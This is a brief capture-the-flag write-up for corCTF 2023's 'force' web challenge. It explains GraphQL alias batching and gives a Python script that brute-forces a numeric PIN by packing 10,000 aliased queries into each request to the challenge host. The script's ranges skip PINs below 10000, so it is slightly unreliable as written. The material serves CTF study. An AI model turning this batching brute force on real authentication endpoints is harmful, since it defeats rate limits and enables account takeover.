+ If you send a query guessing the correct number between 1 to 100k, it will send you the flag.
+ application is using graphql
+ GraphQL allows us to make more than 1 query in the same string
+ Payload:
```
  query GetFlag {
    f1: flag(pin: 1)
    f2: flag(pin: 2)
}
```
Output:
```
{
    "data": {
        "f1": "Wrong!",
        "f2": "Wrong!"
    }
}
```
Exploit:
```
import requests

headers = {
    'Content-Type': 'text/plain;charset=UTF-8',
}

for i in range(10):
    MAX_NUM = 10000 # Max Request Size
    INI = (i*MAX_NUM)+MAX_NUM
    print(f'=========> Brute Range: {INI} - {INI+MAX_NUM-1}')
    QUERIES = '\n'.join([f'f{x}: flag(pin: {x})' for x in range(INI,INI+MAX_NUM)])
    OPERATION = 'query Getflag { ' + QUERIES +' }'

    response = requests.post('https://web-force-force-384c2b201a1a2244.be.ax/', headers=headers, data=OPERATION)

    result = response.text.replace(',', ',\n')
    print(f'Status: {response.status_code}')

    FLAG_PREFIX = 'corctf{'
    index = result.find(FLAG_PREFIX)
    if index > 0:
        flag_ini = index
        flag_end = result.index('}', index+len(FLAG_PREFIX)) + 1
        flag = result[index:flag_end]
        print(f'Flag is {flag}')
        break
    else:
        print('Not yet!')
    print()
```


https://fireshellsecurity.team/corctf2023-web/#challenge-force
